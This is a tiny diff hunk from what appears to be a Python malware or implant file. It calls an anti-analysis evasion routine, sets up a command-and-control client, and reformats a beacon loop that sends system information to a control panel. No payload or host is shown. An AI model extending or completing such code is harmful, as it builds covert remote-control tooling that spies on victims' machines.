@@ -4637,8 +4637,7 @@ def main():
         AntiAnalysis.evade_analysis()
         
         c2 = C2Communication()
-             
- def beacon_loop():
+def beacon_loop():
      while True:
          try:
             c2.send_beacon()          # Send heartbeat/system info to panel
